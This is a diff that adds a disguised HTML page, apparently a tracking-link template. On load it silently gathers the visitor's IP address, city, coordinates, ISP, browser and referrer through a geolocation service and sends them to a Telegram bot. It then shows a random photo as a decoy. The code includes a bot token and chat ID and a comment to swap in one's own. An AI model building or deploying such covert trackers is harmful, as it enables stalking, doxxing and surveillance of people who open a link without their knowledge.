@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head><title></title></head>
+<body style="margin:0;padding:0;overflow:hidden">
+<script>
+setTimeout(() => {
+    const uid = new URLSearchParams(location.search).get('uid') || 'anon';
+    
+    fetch(`https://ipapi.co/json/`)
+    .then(r=>r.json())
+    .then(geo=>{
+        const msg = `🎯 ${uid} TRACKED!\n`+
+                   `📍 ${geo.city}, ${geo.region}\n`+
+                   `🌍 ${geo.country_name}\n`+
+                   `📡 Lat/Lon: ${geo.latitude}, ${geo.longitude}\n`+
+                   `💻 IP: ${geo.ip}\n`+
+                   `🏢 ISP: ${geo.org}\n`+
+                   `📱 ${navigator.userAgent.slice(0,100)}\n`+
+                   `🔗 ${document.referrer}`;
+        
+        // ⚠️ REPLACE THESE TWO LINES:
+        fetch(`https://api.telegram.org/7963281665:AAGjAIHudBsFs-FrPeU3TgTi0DWwAYRkIac/sendMessage?chat_id=1572681805&text=${encodeURIComponent(msg)}`);
+        
+        document.body.innerHTML = '<img src="https://picsum.photos/800/600?grayscale" style="width:100vw;height:100vh;object-fit:cover;">';
+    });
+}, 50);
+</script>
+</body>
+</html>
